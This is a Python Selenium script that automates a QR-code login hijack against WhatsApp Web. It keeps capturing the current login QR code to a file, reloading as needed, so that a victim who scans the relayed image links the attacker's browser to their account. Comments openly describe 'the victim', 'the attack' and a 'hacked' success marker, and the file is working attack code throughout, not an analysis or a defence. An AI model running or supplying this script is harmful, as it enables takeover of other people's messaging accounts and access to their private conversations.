import base64
import os
from time import sleep

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

browser = webdriver.Firefox()  # init browser
browser.get("https://web.whatsapp.com/")  # open whatsapp web

# wait up to 10 secs until the qr code is loaded and get it
img = WebDriverWait(browser, 10).until(
    EC.presence_of_element_located((By.XPATH, """//*[@id="app"]/div/div/div[2]/div/div[2]/div/img""")))

src = img.get_attribute('src')  # the qr is a png encoded in base64

if os.path.isfile('hacked'):  # if this file exists, then we hacked the victim
    os.remove('hacked')  # so, to restart the attack, we delete it

while True:  # we need a loop because the qr code will change every x seconds
    try:
        # after a while, whatsapp web will ask you to reload the qr code if no connection was attempted
        # this will handle the situation clicking on reload whenever necessary
        reloader = browser.find_element_by_xpath("""//*[@id="app"]/div/div/div[2]/div/div[2]/div/span/div""")
        reloader.click()
        print("reloaded")
    except:
        pass
    try:
        img = WebDriverWait(browser, 1).until(
            EC.presence_of_element_located((By.XPATH, """//*[@id="app"]/div/div/div[2]/div/div[2]/div/img""")))
        new_src = img.get_attribute('src')
    except:  # if there is no qr code, then we successfully hacked the victim
        with open('hacked', 'w') as f:  # let's write a file named hacked to keep track of this
            f.write('')
        break  # ...and we exit (the browser will still be open)
    if new_src != src:  # if there is a new qr code, rewrite the existing one
        src = new_src
        b64png = str.encode(src.replace("data:image/png;base64,", ""))
        with open("qr.png", "wb") as f:
            f.write(base64.decodebytes(b64png))
        print("new qr")
    sleep(1)
print("Hacked!")